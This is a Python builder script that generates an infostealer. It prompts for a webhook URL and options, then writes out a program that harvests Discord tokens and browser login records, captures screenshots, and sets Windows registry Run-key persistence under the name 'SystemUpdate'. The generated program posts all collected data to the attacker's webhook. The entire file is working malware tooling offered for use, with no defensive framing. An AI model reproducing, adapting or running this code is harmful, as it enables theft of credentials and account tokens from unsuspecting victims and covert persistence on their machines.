#!/usr/bin/env python3
# Stealer Builder Module

import os

def run():
    print("\n" + "="*60)
    print("STEALER BUILDER")
    print("="*60)
    
    webhook = input("Webhook URL: ").strip()
    filename = input("Filename [stealer]: ").strip() or "stealer"
    persist = input("Persistence? [y]: ").strip().lower() or "y"
    steal_discord = input("Steal Discord tokens? [y]: ").strip().lower() or "y"
    steal_passwords = input("Steal browser passwords? [y]: ").strip().lower() or "y"
    screenshot = input("Take screenshot? [y]: ").strip().lower() or "y"
    
    code = f'''import os, sys, json, requests, platform, time, glob, re, base64, sqlite3, shutil
import subprocess, ctypes
try: from PIL import ImageGrab
except: pass
PERSIST = {str(persist == 'y').lower()}
STEAL_DISCORD = {str(steal_discord == 'y').lower()}
STEAL_PASSWORDS = {str(steal_passwords == 'y').lower()}
SCREENSHOT = {str(screenshot == 'y').lower()}
WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"

def get_system_info():
    return {{
        "hostname": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "user": os.getlogin(),
        "cpu": os.cpu_count()
    }}

def steal_discord_tokens():
    if not STEAL_DISCORD: return []
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb/*.log"))
    for p in paths:
        if os.path.exists(p):
            with open(p, 'r', errors='ignore') as f:
                for line in f:
                    matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                    tokens.extend(matches)
    return tokens

def steal_browser_passwords():
    if not STEAL_PASSWORDS: return []
    passwords = []
    browsers = []
    if IS_WIN:
        browsers = [("Chrome", os.path.expandvars("%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default")),
                    ("Edge", os.path.expandvars("%LOCALAPPDATA%\\\\Microsoft\\\\Edge\\\\User Data\\\\Default"))]
    else:
        browsers = [("Chrome", os.path.expanduser("~/.config/google-chrome/Default")),
                    ("Edge", os.path.expanduser("~/.config/microsoft-edge/Default"))]
    for name, path in browsers:
        login_db = os.path.join(path, "Login Data")
        if os.path.exists(login_db):
            try:
                import sqlite3
                shutil.copy2(login_db, "/tmp/login.db")
                conn = sqlite3.connect("/tmp/login.db")
                c = conn.cursor()
                c.execute("SELECT origin_url, username_value FROM logins LIMIT 20")
                for row in c.fetchall():
                    passwords.append({{"browser": name, "url": row[0], "username": row[1]}})
                conn.close()
                os.remove("/tmp/login.db")
            except: pass
    return passwords

def take_screenshot():
    if not SCREENSHOT: return None
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        img.save("/tmp/screen.png")
        with open("/tmp/screen.png", 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except: return None

def persist_windows():
    if not PERSIST or not IS_WIN: return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "SystemUpdate", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
    except: pass

def main():
    data = {{"system": get_system_info()}}
    data["tokens"] = steal_discord_tokens()
    data["passwords"] = steal_browser_passwords()
    img = take_screenshot()
    if img: data["screenshot"] = img
    persist_windows()
    try:
        requests.post(WEBHOOK, json=data, timeout=10)
    except: pass

if __name__ == "__main__":
    main()
'''
    
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, filename + ".py")
    with open(path, 'w') as f:
        f.write(code)
    
    print(f"Stealer saved: {path}")

if __name__ == "__main__":
    run()